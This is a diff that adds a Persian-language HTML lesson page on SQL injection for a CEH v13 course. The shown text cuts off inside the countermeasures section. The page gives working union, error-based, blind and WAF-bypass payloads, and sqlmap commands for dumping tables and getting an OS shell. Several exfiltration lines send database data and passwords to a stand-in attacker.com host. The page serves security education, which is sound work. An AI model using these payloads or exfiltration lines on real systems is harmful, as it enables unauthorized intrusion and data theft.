@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ماژول ۱۵ - SQL Injection - دوره CEH V13</title>
+    <link rel="stylesheet" href="../../style.css">
+    <style>
+        .toc {
+            background: #eef3f7;
+            padding: 15px 25px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            border-right: 4px solid #2a7de1;
+        }
+        .toc ul {
+            columns: 2;
+            list-style: none;
+            padding: 0;
+            margin: 10px 0;
+        }
+        .toc ul li {
+            margin: 6px 0;
+            padding: 4px 8px;
+            border-radius: 6px;
+            transition: background 0.2s;
+        }
+        .toc ul li:hover {
+            background: #dce3ea;
+        }
+        .toc ul li a {
+            text-decoration: none;
+            color: #0b3b5c;
+            font-weight: 500;
+        }
+        .toc ul li a:hover {
+            color: #2a7de1;
+        }
+        .copy-btn {
+            background: #2a7de1;
+            color: white;
+            border: none;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            float: left;
+            transition: background 0.2s;
+        }
+        .copy-btn:hover {
+            background: #1a5fb0;
+        }
+        .code-block {
+            position: relative;
+            background: #1e2a3a;
+            padding: 15px;
+            border-radius: 10px;
+            overflow-x: auto;
+            margin: 10px 0;
+            border-left: 5px solid #2a7de1;
+        }
+        .code-block code {
+            background: transparent;
+            border: none;
+            color: #e4eef7;
+            padding: 0;
+            font-size: 0.95rem;
+        }
+        .code-block .copy-btn {
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            background: #4a5a7a;
+        }
+        .code-block .copy-btn:hover {
+            background: #2a7de1;
+        }
+        @media (max-width: 768px) {
+            .toc ul { columns: 1; }
+        }
+        table tr:hover {
+            background: #e8f0fe !important;
+        }
+        .highlight-box {
+            background: #e8f0fe;
+            border-right: 6px solid #ff9f1c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .warning-box {
+            background: #fef0e8;
+            border-right: 6px solid #e74c3c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .tip-box {
+            background: #e8fef0;
+            border-right: 6px solid #27ae60;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .info-box {
+            background: #e8f0fe;
+            border-right: 6px solid #2a7de1;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .table-responsive {
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            margin: 16px 0 12px 0;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+        .glossary-term {
+            font-weight: 700;
+            color: #0b3b5c;
+            background: #e8f0fe;
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== نوار ناوبری ===== -->
+    <div class="nav-bar">
+        <span dir='ltr'>📘 CEH V13</span>
+        <span dir='ltr'>
+            <a href="../../../index.html">خانه</a> |
+            <a href="../index.html">ماژول‌ها</a>
+        </span>
+    </div>
+
+    <h1>📚 ماژول ۱۵ – SQL Injection</h1>
+
+    <!-- ===== فهرست مطالب ===== -->
+    <div class="toc">
+        <strong>📑 فهرست مطالب (کلیک کنید):</strong>
+        <ul>
+            <li><a href="#intro">🔰 مقدمه – SQL Injection چیست؟</a></li>
+            <li><a href="#basics">📖 مفاهیم پایه SQL</a></li>
+            <li><a href="#types">🎯 انواع SQL Injection</a></li>
+            <li><a href="#in-band">📡 In-band SQLi (Union-based, Error-based)</a></li>
+            <li><a href="#blind">🕵️ Blind SQLi (Boolean-based, Time-based)</a></li>
+            <li><a href="#out-of-band">🌐 Out-of-band SQLi</a></li>
+            <li><a href="#detection">🔍 تشخیص SQL Injection</a></li>
+            <li><a href="#tools">🛠️ ابزارهای SQL Injection</a></li>
+            <li><a href="#sqlmap">📡 آموزش جامع SQLmap</a></li>
+            <li><a href="#advanced">🚀 تکنیک‌های پیشرفته</a></li>
+            <li><a href="#bypass">🛡️ دور زدن WAF و فیلترها</a></li>
+            <li><a href="#countermeasures">🛡️ راه‌های مقابله با SQL Injection</a></li>
+            <li><a href="#ai-sqli">🤖 SQL Injection با هوش مصنوعی</a></li>
+            <li><a href="#lab-exercise">🧪 کارگاه عملی</a></li>
+            <li><a href="#practice-exercises">📝 تمرین‌های عملی</a></li>
+            <li><a href="#glossary">📖 واژه‌نامه تخصصی</a></li>
+        </ul>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱: مقدمه -->
+    <!-- ============================================================ -->
+    <div class="card" id="intro">
+        <h2>🔰 مقدمه – SQL Injection چیست؟</h2>
+        <p>
+            <b>SQL Injection (تزریق SQL)</b> یکی از معروف‌ترین، قدیمی‌ترین و خطرناک‌ترین آسیب‌پذیری‌های امنیت برنامه‌های وب است. در این حمله، مهاجم با تزریق کدهای SQL مخرب به ورودی‌های برنامه (مانند فرم‌ها، پارامترهای URL یا کوکی‌ها)، کوئری‌های SQL اصلی را تغییر داده و به اطلاعات حساس پایگاه داده دسترسی پیدا می‌کند.
+        </p>
+        <p>
+            SQL Injection از سال ۱۹۹۸ شناسایی شده و همچنان یکی از اصلی‌ترین تهدیدات برنامه‌های وب محسوب می‌شود. این آسیب‌پذیری در لیست <b>OWASP Top 10</b> در رتبه سوم قرار دارد و سالانه خسارت‌های مالی و اعتباری هنگفتی به سازمان‌ها وارد می‌کند.
+        </p>
+        <p>
+            در این ماژول، با مفاهیم پایه SQL، انواع حملات SQL Injection، روش‌های تشخیص، ابزارهای تخصصی و مهم‌تر از همه، تکنیک‌های جلوگیری از این آسیب‌پذیری آشنا خواهید شد.
+        </p>
+        <div class="warning-box">
+            <b>⚠️ هشدار اخلاقی:</b> SQL Injection یکی از جدی‌ترین تهدیدات امنیتی است. تمام تمرینات این ماژول فقط در محیط‌های آزمایشگاهی با مجوز انجام شوند. حمله به پایگاه‌های داده واقعی بدون مجوز جرم است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۲: مفاهیم پایه SQL -->
+    <!-- ============================================================ -->
+    <div class="card" id="basics">
+        <h2>📖 مفاهیم پایه SQL</h2>
+        <p>
+            برای درک SQL Injection، ابتدا باید با مفاهیم پایه SQL (Structured Query Language) آشنا شوید. SQL زبانی است که برای مدیریت پایگاه‌های داده رابطه‌ای استفاده می‌شود.
+        </p>
+
+        <h3>📌 دستورات اصلی SQL:</h3>
+        <div class="table-responsive">
+            <table>
+                <tr><th>دستور</th><th>کاربرد</th><th>مثال</th></tr>
+                <tr><td><b>SELECT</b></td><td>خواندن داده از پایگاه داده</td><td><code dir='ltr'>SELECT * FROM users</code></td></tr>
+                <tr><td><b>INSERT</b></td><td>اضافه کردن داده جدید</td><td><code dir='ltr'>INSERT INTO users VALUES ('admin','pass')</code></td></tr>
+                <tr><td><b>UPDATE</b></td><td>به‌روزرسانی داده</td><td><code dir='ltr'>UPDATE users SET password='new' WHERE id=1</code></td></tr>
+                <tr><td><b>DELETE</b></td><td>حذف داده</td><td><code dir='ltr'>DELETE FROM users WHERE id=1</code></td></tr>
+                <tr><td><b>UNION</b></td><td>ترکیب نتایج دو کوئری</td><td><code dir='ltr'>SELECT name FROM users UNION SELECT password FROM secrets</code></td></tr>
+                <tr><td><b>JOIN</b></td><td>اتصال چند جدول</td><td><code dir='ltr'>SELECT * FROM orders JOIN users ON orders.user_id = users.id</code></td></tr>
+            </table>
+        </div>
+
+        <h3>📌 مثال یک کوئری SQL آسیب‌پذیر:</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'>&lt;?php
+$id = $_GET['id'];
+$query = "SELECT * FROM products WHERE id = $id";
+$result = mysqli_query($conn, $query);
+?&gt;</code></pre>
+        </div>
+        <p>
+            در این کد، ورودی کاربر مستقیماً در کوئری قرار گرفته است. اگر کاربر به جای یک عدد، کد SQL مخرب وارد کند، کوئری تغییر می‌کند و مهاجم می‌تواند به تمام داده‌های جدول دسترسی پیدا کند.
+        </p>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> درک دقیق SQL برای شناسایی و بهره‌برداری از SQL Injection ضروری است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۳: انواع SQL Injection -->
+    <!-- ============================================================ -->
+    <div class="card" id="types">
+        <h2>🎯 انواع SQL Injection</h2>
+        <p>
+            SQL Injection به سه دسته اصلی تقسیم می‌شود که هر کدام روش‌های تشخیص و بهره‌برداری خاص خود را دارند:
+        </p>
+
+        <h3>📌 ۱. In-band SQL Injection (کلاسیک)</h3>
+        <ul>
+            <li>مهاجم از همان کانال ارتباطی برای تزریق و دریافت داده استفاده می‌کند.</li>
+            <li>شامل دو نوع است:
+                <ul>
+                    <li><b>Union-based:</b> استفاده از دستور <code dir='ltr'>UNION</code> برای ترکیب نتایج.</li>
+                    <li><b>Error-based:</b> استفاده از پیام‌های خطای پایگاه داده برای استخراج اطلاعات.</li>
+                </ul>
+            </li>
+            <li><b>ساده‌ترین و رایج‌ترین نوع.</b></li>
+        </ul>
+
+        <h3>📌 ۲. Blind SQL Injection (کور)</h3>
+        <ul>
+            <li>مهاجم پاسخ مستقیم دریافت نمی‌کند و باید از تفاوت‌های رفتار برنامه استفاده کند.</li>
+            <li>شامل دو نوع است:
+                <ul>
+                    <li><b>Boolean-based:</b> استفاده از شرط‌های True/False برای تشخیص.</li>
+                    <li><b>Time-based:</b> استفاده از تأخیر در پاسخ برای تشخیص.</li>
+                </ul>
+            </li>
+            <li><b>سخت‌تر اما در بسیاری از برنامه‌ها وجود دارد.</b></li>
+        </ul>
+
+        <h3>📌 ۳. Out-of-band SQL Injection</h3>
+        <ul>
+            <li>مهاجم از یک کانال ارتباطی دیگر (مانند DNS یا HTTP) برای دریافت داده استفاده می‌کند.</li>
+            <li>معمولاً زمانی استفاده می‌شود که In-band و Blind ممکن نباشند.</li>
+            <li><b>کمتر رایج اما بسیار قدرتمند.</b></li>
+        </ul>
+
+        <div class="info-box">
+            <b>💡 نکته:</b> انتخاب نوع حمله به ساختار برنامه و امکانات موجود بستگی دارد. معمولاً با In-band شروع می‌شود و در صورت نیاز به Blind یا Out-of-band می‌روند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۴: In-band SQLi -->
+    <!-- ============================================================ -->
+    <div class="card" id="in-band">
+        <h2>📡 In-band SQL Injection (Union-based و Error-based)</h2>
+        <p>
+            <b>In-band SQL Injection</b> رایج‌ترین و ساده‌ترین نوع SQL Injection است که در آن مهاجم مستقیماً نتایج کوئری را در پاسخ HTTP مشاهده می‌کند.
+        </p>
+
+        <h3>🔵 Union-based SQL Injection</h3>
+        <p>
+            در این روش، مهاجم از دستور <code dir='ltr'>UNION</code> برای ترکیب نتایج کوئری اصلی با نتایج کوئری خود استفاده می‌کند. هدف اصلی پیدا کردن تعداد ستون‌ها و سپس استخراج داده از جداول دیگر است.
+        </p>
+
+        <h3>📌 مراحل Union-based SQLi:</h3>
+        <ol>
+            <li><b>پیدا کردن تعداد ستون‌ها:</b> با استفاده از <code dir='ltr'>ORDER BY</code> یا <code dir='ltr'>UNION SELECT NULL</code>.</li>
+            <li><b>پیدا کردن ستون‌های قابل نمایش:</b> شناسایی ستون‌هایی که در صفحه نمایش داده می‌شوند.</li>
+            <li><b>استخراج اطلاعات:</b> استفاده از <code dir='ltr'>UNION SELECT</code> برای خواندن داده از جداول دیگر.</li>
+        </ol>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># پیدا کردن تعداد ستون‌ها
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+# پیدا کردن ستون‌های قابل نمایش (با شمارنده NULL)
+1' UNION SELECT NULL,NULL,NULL-- -
+
+# استخراج نام پایگاه داده
+1' UNION SELECT NULL,database(),NULL-- -
+
+# استخراج نام جداول
+1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
+
+# استخراج داده از جدول users
+1' UNION SELECT NULL,username,password FROM users-- -</code></pre>
+        </div>
+
+        <h3>🔴 Error-based SQL Injection</h3>
+        <p>
+            در این روش، مهاجم از پیام‌های خطای پایگاه داده برای استخراج اطلاعات استفاده می‌کند. برخی از پایگاه‌های داده مانند MySQL، پیام‌های خطای مفصلی را نمایش می‌دهند که می‌توانند حاوی اطلاعات مفیدی باشند.
+        </p>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># ایجاد خطای تقسیم بر صفر برای نمایش نام پایگاه داده
+1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+
+# استخراج نام جدول
+1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(table_name,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> Error-based SQLi یکی از سریع‌ترین روش‌های استخراج اطلاعات است، اما نیاز به نمایش خطاهای پایگاه داده دارد که در بسیاری از برنامه‌های مدرن غیرفعال است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۵: Blind SQLi -->
+    <!-- ============================================================ -->
+    <div class="card" id="blind">
+        <h2>🕵️ Blind SQL Injection (Boolean-based و Time-based)</h2>
+        <p>
+            <b>Blind SQL Injection</b> زمانی استفاده می‌شود که برنامه نتایج کوئری را به کاربر نمایش نمی‌دهد و پیام‌های خطا نیز غیرفعال هستند. در این حالت، مهاجم باید از تفاوت‌های رفتار برنامه برای استخراج اطلاعات استفاده کند.
+        </p>
+
+        <h3>⚪ Boolean-based Blind SQLi</h3>
+        <p>
+            مهاجم با ارسال کوئری‌های شرطی (True/False) و مشاهده تفاوت در پاسخ برنامه (مثل محتوای صفحه، کد وضعیت HTTP) اطلاعات را استخراج می‌کند.
+        </p>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># بررسی وجود یک رکورد
+1' AND 1=1-- -   // True → صفحه عادی
+1' AND 1=2-- -   // False → صفحه خالی یا خطا
+
+# استخراج کاراکتر اول نام پایگاه داده (با حدس)
+1' AND SUBSTRING(database(),1,1)='a'-- -
+1' AND ASCII(SUBSTRING(database(),1,1))=97-- -
+
+# استخراج نام جدول (کاراکتر به کاراکتر)
+1' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='u'-- -</code></pre>
+        </div>
+
+        <h3>⏱️ Time-based Blind SQLi</h3>
+        <p>
+            مهاجم با استفاده از توابعی مانند <code dir='ltr'>SLEEP()</code> یا <code dir='ltr'>BENCHMARK()</code> تأخیر در پاسخ ایجاد می‌کند و بر اساس زمان پاسخ (با یا بدون تأخیر) اطلاعات را استخراج می‌کند.
+        </p>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># بررسی وجود رکورد با تأخیر ۵ ثانیه
+1' AND SLEEP(5)-- -   // اگر True باشد، ۵ ثانیه تأخیر
+
+# استخراج کاراکتر اول نام پایگاه داده
+1' AND IF(ASCII(SUBSTRING(database(),1,1))=97,SLEEP(5),0)-- -</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> Time-based SQLi زمان‌بر است و ممکن است شبکه را تحت تأثیر قرار دهد. در محیط‌های واقعی باید با دقت استفاده شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۶: Out-of-band SQLi -->
+    <!-- ============================================================ -->
+    <div class="card" id="out-of-band">
+        <h2>🌐 Out-of-band SQL Injection</h2>
+        <p>
+            <b>Out-of-band SQL Injection</b> زمانی استفاده می‌شود که مهاجم نتواند از In-band یا Blind استفاده کند. در این روش، مهاجم از قابلیت‌های پایگاه داده (مانند <code dir='ltr'>LOAD_FILE()</code>، <code dir='ltr'>INTO OUTFILE</code> یا DNS requests) برای ارسال اطلاعات به یک سرور خارجی استفاده می‌کند.
+        </p>
+
+        <h3>📌 مثال Out-of-band با DNS (MySQL):</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># ارسال نام پایگاه داده از طریق DNS
+1' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\test'))-- -
+
+# ارسال اطلاعات از طریق HTTP با UTL_HTTP (Oracle)
+1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE id=1)) FROM dual-- -</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> Out-of-band SQLi بسیار قدرتمند است اما نیاز به شرایط خاصی دارد (مثل دسترسی به UTL_HTTP یا DNS).
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۷: تشخیص SQL Injection -->
+    <!-- ============================================================ -->
+    <div class="card" id="detection">
+        <h2>🔍 تشخیص SQL Injection</h2>
+        <p>
+            تشخیص SQL Injection اولین گام برای بهره‌برداری است. روش‌های مختلفی برای تشخیص وجود دارد که در ادامه معرفی می‌شوند:
+        </p>
+
+        <h3>📌 روش‌های دستی:</h3>
+        <ul>
+            <li><b>تست با کاراکترهای ویژه:</b> وارد کردن <code dir='ltr'>'</code>، <code dir='ltr'>"</code>، <code dir='ltr'>;</code>، <code dir='ltr'>)</code> و مشاهده خطا.</li>
+            <li><b>تست با عبارات منطقی:</b> <code dir='ltr'>1' AND 1=1-- -</code> و <code dir='ltr'>1' AND 1=2-- -</code> و مقایسه پاسخ‌ها.</li>
+            <li><b>تست با تأخیر:</b> <code dir='ltr'>1' AND SLEEP(5)-- -</code> و بررسی زمان پاسخ.</li>
+            <li><b>تست با UNION:</b> <code dir='ltr'>1' UNION SELECT NULL-- -</code> و مشاهده تغییرات.</li>
+        </ul>
+
+        <h3>📌 ابزارهای تشخیص خودکار:</h3>
+        <ul>
+            <li><b>SQLmap:</b> قوی‌ترین ابزار خودکار.</li>
+            <li><b>Burp Suite:</b> با پسوندهای مختلف (مانند SQLi Scanner).</li>
+            <li><b>OWASP ZAP:</b> با قابلیت اسکن خودکار.</li>
+            <li><b>Acunetix:</b> اسکنر تجاری.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># تست دستی ساده در یک فرم ورود
+ورودی: admin'--
+# اگر برنامه با موفقیت وارد شود، احتمال SQL Injection وجود دارد.
+
+# تست با خطا
+ورودی: admin' AND 1=1--
+ورودی: admin' AND 1=2--
+# اگر پاسخ‌ها متفاوت باشند، احتمال SQL Injection وجود دارد.
+
+# تست با UNION
+ورودی: 1' UNION SELECT NULL, NULL, NULL-- -
+# اگر صفحه تغییر کند یا خطایی رخ دهد، شماره ستون‌ها قابل تشخیص است.</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> تست با کاراکتر ساده <code dir='ltr'>'</code> یکی از سریع‌ترین راه‌ها برای تشخیص SQL Injection است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۸: ابزارهای SQL Injection -->
+    <!-- ============================================================ -->
+    <div class="card" id="tools">
+        <h2>🛠️ ابزارهای SQL Injection</h2>
+        <p>
+            ابزارهای متعددی برای تشخیص و بهره‌برداری از SQL Injection وجود دارند که در این بخش مهم‌ترین آنها را معرفی می‌کنیم:
+        </p>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>ابزار</th><th>نوع</th><th>ویژگی‌ها</th></tr>
+                <tr>
+                    <td><b>SQLmap</b></td>
+                    <td>خودکار (خط فرمان)</td>
+                    <td>قوی‌ترین ابزار، پشتیبانی از تمام انواع SQLi، خودکارسازی کامل</td>
+                </tr>
+                <tr>
+                    <td><b>Burp Suite</b></td>
+                    <td>دستی/نیمه‌خودکار</td>
+                    <td>پسوندهای مختلف برای SQLi، دستکاری درخواست‌ها</td>
+                </tr>
+                <tr>
+                    <td><b>OWASP ZAP</b></td>
+                    <td>دستی/نیمه‌خودکار</td>
+                    <td>اسکن خودکار SQLi، رابط گرافیکی</td>
+                </tr>
+                <tr>
+                    <td><b>Havij</b></td>
+                    <td>خودکار (ویندوز)</td>
+                    <td>رابط گرافیکی، مناسب برای مبتدیان (ویندوز)</td>
+                </tr>
+                <tr>
+                    <td><b>jSQL</b></td>
+                    <td>خودکار (جاوا)</td>
+                    <td>رابط گرافیکی، پشتیبانی از انواع SQLi</td>
+                </tr>
+                <tr>
+                    <td><b>SQLNinja</b></td>
+                    <td>خودکار</td>
+                    <td>تخصصی برای SQL Injection در MS SQL Server</td>
+                </tr>
+                <tr>
+                    <td><b>BBQSQL</b></td>
+                    <td>خودکار (Python)</td>
+                    <td>Blind SQL Injection با پشتیبانی از Boolean و Time-based</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="info-box">
+            <b>💡 نکته:</b> SQLmap قوی‌ترین و محبوب‌ترین ابزار SQL Injection است که در Kali Linux به صورت پیش‌فرض نصب است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۹: آموزش جامع SQLmap -->
+    <!-- ============================================================ -->
+    <div class="card" id="sqlmap">
+        <h2>📡 آموزش جامع SQLmap</h2>
+        <p>
+            <b>SQLmap</b> یک ابزار متن‌باز قدرتمند برای تشخیص و بهره‌برداری از آسیب‌پذیری‌های SQL Injection است. این ابزار در Kali Linux به صورت پیش‌فرض نصب است و از تمام انواع SQL Injection پشتیبانی می‌کند.
+        </p>
+
+        <h3>📌 دستورات پایه SQLmap:</h3>
+        <div class="table-responsive">
+            <table>
+                <tr><th>دستور</th><th>توضیح</th></tr>
+                <tr><td><code dir='ltr'>sqlmap -u "http://target.com/page.php?id=1"</code></td><td>تشخیص خودکار SQLi در یک URL</td></tr>
+                <tr><td><code dir='ltr'>sqlmap -u "..." --dbs</code></td><td>لیست پایگاه‌های داده</td></tr>
+                <tr><td><code dir='ltr'>sqlmap -u "..." -D database_name --tables</code></td><td>لیست جداول یک پایگاه داده</td></tr>
+                <tr><td><code dir='ltr'>sqlmap -u "..." -D database_name -T table_name --dump</code></td><td>استخراج داده از یک جدول</td></tr>
+                <tr><td><code dir='ltr'>sqlmap -u "..." --cookie="PHPSESSID=abc123"</code></td><td>استفاده از کوکی برای احراز هویت</td></tr>
+                <tr><td><code dir='ltr'>sqlmap -u "..." --data="id=1&name=test"</code></td><td>ارسال درخواست POST</td></tr>
+                <tr><td><code dir='ltr'>sqlmap -u "..." --level=3 --risk=2</code></td><td>اسکن با سطح و ریسک بالاتر</td></tr>
+                <tr><td><code dir='ltr'>sqlmap -u "..." --os-shell</code></td><td>دریافت شل سیستمی (در صورت دسترسی)</td></tr>
+                <tr><td><code dir='ltr'>sqlmap -u "..." --batch</code></td><td>اجرای خودکار بدون سوال</td></tr>
+                <tr><td><code dir='ltr'>sqlmap -u "..." --threads=10</code></td><td>استفاده از ۱۰ ترد برای سرعت بیشتر</td></tr>
+            </table>
+        </div>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># اسکن یک URL ساده
+sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123"
+
+# اگر کوکی نیاز باشد (برای DVWA):
+sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=12345"
+
+# استخراج پایگاه‌های داده
+sqlmap -u "..." --cookie="..." --dbs
+
+# استخراج جداول پایگاه داده 'dvwa'
+sqlmap -u "..." --cookie="..." -D dvwa --tables
+
+# استخراج داده از جدول 'users'
+sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
+
+# دریافت شل سیستمی (در صورت وجود آسیب‌پذیری پیشرفته)
+sqlmap -u "..." --cookie="..." --os-shell</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> SQLmap بسیار قدرتمند است اما باید با دقت و فقط در محیط‌های مجاز استفاده شود. استفاده از گزینه <code dir='ltr'>--batch</code> برای خودکارسازی کامل مفید است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۰: تکنیک‌های پیشرفته -->
+    <!-- ============================================================ -->
+    <div class="card" id="advanced">
+        <h2>🚀 تکنیک‌های پیشرفته SQL Injection</h2>
+        <p>
+            پس از آشنایی با مبانی، در این بخش با تکنیک‌های پیشرفته‌تر SQL Injection آشنا می‌شوید:
+        </p>
+
+        <h3>📌 ۱. Second-Order SQL Injection</h3>
+        <p>
+            در این نوع، payload در ابتدا در پایگاه داده ذخیره می‌شود و سپس در یک کوئری دیگر (بدون فیلتر) اجرا می‌شود. این نوع از حملات به دلیل ذخیره‌سازی، تشخیص‌پذیری کمتری دارند.
+        </p>
+
+        <h3>📌 ۲. SQL Injection در Stored Procedures</h3>
+        <p>
+            بسیاری از برنامه‌ها از Stored Procedures برای دسترسی به پایگاه داده استفاده می‌کنند. اگر ورودی‌ها به درستی فیلتر نشوند، مهاجم می‌تواند به Stored Procedures تزریق کند.
+        </p>
+
+        <h3>📌 ۳. SQL Injection در JSON/XML</h3>
+        <p>
+            با افزایش استفاده از APIها، SQL Injection در payloadهای JSON و XML نیز رایج شده است. مهاجم می‌تواند کد SQL را در فیلدهای JSON یا XML تزریق کند.
+        </p>
+
+        <h3>📌 ۴. DNS Exfiltration</h3>
+        <p>
+            در برخی موارد، مهاجم نمی‌تواند داده را مستقیماً دریافت کند. با استفاده از DNS requests، می‌تواند داده را به سرور خود ارسال کند.
+        </p>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># Second-Order SQL Injection
+مرحله ۱: ثبت نام با username = admin'--
+مرحله ۲: در پروفایل کاربر، کوئری بعدی اجرا می‌شود که آسیب‌پذیر است
+
+# SQL Injection در JSON
+{"username": "admin'--", "password": "test"}
+
+# DNS Exfiltration (MySQL)
+1' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE id=1),'.attacker.com\\test'))-- -</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> تکنیک‌های پیشرفته نیاز به دانش بالایی از پایگاه داده و برنامه دارند و فقط در محیط‌های مجاز استفاده شوند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۱: دور زدن WAF و فیلترها -->
+    <!-- ============================================================ -->
+    <div class="card" id="bypass">
+        <h2>🛡️ دور زدن WAF و فیلترها (WAF Bypass)</h2>
+        <p>
+            بسیاری از برنامه‌های وب از WAF (Web Application Firewall) یا فیلترهای ورودی برای جلوگیری از SQL Injection استفاده می‌کنند. در این بخش، تکنیک‌های دور زدن این فیلترها را معرفی می‌کنیم:
+        </p>
+
+        <h3>📌 تکنیک‌های رایج Bypass:</h3>
+        <ul>
+            <li><b>تغییر حروف (Case Variation):</b> <code dir='ltr'>SeLeCt</code> به جای <code dir='ltr'>SELECT</code></li>
+            <li><b>استفاده از کدگذاری URL:</b> <code dir='ltr'>%27</code> به جای <code dir='ltr'>'</code></li>
+            <li><b>استفاده از کدگذاری دوگانه:</b> <code dir='ltr'>%2527</code> (URL encoding دوگانه)</li>
+            <li><b>استفاده از کامنت‌های مختلف:</b> <code dir='ltr'>-- -</code>، <code dir='ltr'>#</code>، <code dir='ltr'>/* */</code></li>
+            <li><b>استفاده از تابع‌های جایگزین:</b> <code dir='ltr'>CONCAT()</code> به جای <code dir='ltr'>+</code></li>
+            <li><b>استفاده از کدهای یونیکد:</b> <code dir='ltr'>%c0%a7</code> به جای <code dir='ltr'>'</code></li>
+            <li><b>استفاده از تکنیک‌های Obfuscation:</b> <code dir='ltr'>/**/</code> برای شکستن کلمات کلیدی</li>
+            <li><b>استفاده از تکنیک‌های SQL خاص:</b> <code dir='ltr'>/*!50000SELECT*/</code> (برخی پایگاه‌های داده از این کامنت‌ها پشتیبانی می‌کنند)</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># نمونه‌های Bypass
+1' OR '1'='1'-- -          // معمولی
+1' %4F%52 '1'='1'-- -     // URL Encoding
+1' /**/OR/**/'1'='1'-- -  // کامنت‌ها
+1' || '1'='1'-- -         // عملگر جایگزین (PostgreSQL)
+1' OR 1=1#                // کامنت #
+
+# استفاده از تابع‌های جایگزین
+SELECT CONCAT('a','b') AS test
+
+# Obfuscation با کامنت‌های SQL
+1' /*!OR*/ '1'='1'-- -</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> دور زدن WAF نیاز به آزمایش و خطا دارد. استفاده از ابزارهایی مانند SQLmap با گزینه <code dir='ltr'>--tamper</code> می‌تواند کمک کند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۲: راه‌های مقابله با SQL Injection -->
+    <!-- ============================================================ -->
+    <div class="card" id="countermeasures">
+        <h2>🛡️ راه‌های مقابله با SQL Injection</h2>
+        <p>
+            برای جلوگیری از SQL Injection، توسعه‌دهندگان و مدیران باید اقدامات زیر را انجام دهند:
+        </p>
+
+        <h3>📌 اقدامات کلی:</h3>
+        <ul>
+            <li><b>استفاده از Prepared Statements (Parameterized Queries):</b> مهم‌ترین و مؤثرترین روش.</li>
+            <li><b>استفاده از Stored Procedures:</b> با پارامترهای امن.</li>
+            <li><b>فیلتر کردن ورودی‌ها (Input Validation):</b> اعتبارسنجی نوع و طول داده.</li>
+            <li><b>استفاده از ORM (Object-Relational Mapping):</b> مانند Hibernate، Entity Framework.</li>
+            <li><b>محدود کردن مجوزهای پایگاه داده:</b> اصل کمترین دسترسی.</li>
